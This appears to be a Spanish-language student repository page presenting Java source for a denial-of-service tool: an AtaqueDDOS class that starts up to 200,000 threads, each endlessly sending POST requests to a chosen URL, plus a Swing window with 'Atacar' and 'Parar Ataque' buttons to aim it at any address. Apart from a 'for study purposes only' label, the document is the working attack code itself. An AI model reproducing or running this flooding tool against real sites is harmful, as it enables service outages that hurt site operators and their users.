**Código de la clase**
```java

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

import javax.net.ssl.SSLSocket;

public class AtaqueDDOS extends Thread {

	private static AtomicBoolean permitirAtaque = new AtomicBoolean(true);
	private final URL url;

	String param = null;

	public AtaqueDDOS(String input) throws Exception {
		url = new URL(input);
		param = "param1=" + URLEncoder.encode("87845", "UTF-8");
	}

	@Override
	public void run() {
		while (permitirAtaque.get()) {
			try {
				enviarPeticion();
			} catch (Exception e) {

			}
		}
	}

	public void enviarPeticion() throws Exception {
		HttpURLConnection connection = (HttpURLConnection) url.openConnection();
		connection.setDoOutput(true);
		connection.setDoInput(true);
		connection.setRequestMethod("POST");
		connection.setRequestProperty("charset", "utf-8");
		connection.setRequestProperty("Host", "localhost");
		// navegador simulado desde donde se lanza la petición
		connection.setRequestProperty("User-Agent",
				"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
		connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
		connection.setRequestProperty("Content-Length", param);
		System.out.println(this + " " + connection.getResponseCode());
		connection.getInputStream();
	}

	public static void atacar(String url) {
		try {

			for (int i = 0; i < 200000; i++) {
				AtaqueDDOS hilo = new AtaqueDDOS(url);
				hilo.start();

			}

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void parar() {
		AtaqueDDOS.permitirAtaque = new AtomicBoolean(false);
	}
}
```
____
**Códigode la interfaz del formulario**
```java
import java.awt.BorderLayout;
import java.awt.EventQueue;

import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.JLabel;
import javax.swing.JOptionPane;

import java.awt.Color;
import javax.swing.JTextField;
import javax.swing.JButton;
import java.awt.Font;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

public class FormularioAtaqueDDOS extends JFrame {

	private JPanel contentPane;
	private JTextField tf_url;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					FormularioAtaqueDDOS frame = new FormularioAtaqueDDOS();
					frame.setVisible(true);
					ImageIcon img = new ImageIcon("ddosIcono.jpg");
					frame.setIconImage(img.getImage());
					frame.setResizable(false);

				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the frame.
	 */
	public FormularioAtaqueDDOS() {

		setTitle("Ataque DDOS");
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 831, 576);
		contentPane = new JPanel();
		contentPane.setBackground(Color.BLACK);
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(null);

		JLabel lblSloConFines = new JLabel("Solo con fines de estudio");
		lblSloConFines.setFont(new Font("Tahoma", Font.PLAIN, 20));
		lblSloConFines.setForeground(Color.WHITE);
		lblSloConFines.setBounds(289, 16, 228, 37);
		contentPane.add(lblSloConFines);

		JLabel lblIntroduceLaUrl = new JLabel("Introduce la URL:");
		lblIntroduceLaUrl.setFont(new Font("Tahoma", Font.PLAIN, 18));
		lblIntroduceLaUrl.setForeground(Color.WHITE);
		lblIntroduceLaUrl.setBounds(201, 114, 146, 20);
		contentPane.add(lblIntroduceLaUrl);

		tf_url = new JTextField();
		tf_url.setFont(new Font("Tahoma", Font.PLAIN, 24));
		tf_url.setBounds(201, 177, 405, 37);
		contentPane.add(tf_url);
		tf_url.setColumns(10);

		JButton btnAtacar = new JButton("Atacar");
		btnAtacar.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {

				if (tf_url.getText().isEmpty()) {
					JOptionPane.showMessageDialog(null, "La URL no puede ser cadena vacía.");
				} else {
					AtaqueDDOS.atacar(tf_url.getText());
				}
			}
		});
		btnAtacar.setBackground(Color.WHITE);
		btnAtacar.setForeground(Color.BLACK);
		btnAtacar.setBounds(201, 264, 125, 37);
		contentPane.add(btnAtacar);

		JButton btnNewButton = new JButton("Parar Ataque");
		btnNewButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				AtaqueDDOS.parar();
			}
		});
		btnNewButton.setBackground(Color.WHITE);
		btnNewButton.setBounds(481, 264, 125, 37);
		contentPane.add(btnNewButton);
	}
}
```
___

***Imagen de l a Interfaz***

<img src="https://github.com/cynthiazl/PSP/blob/master/interefaz.png" width="350"/>
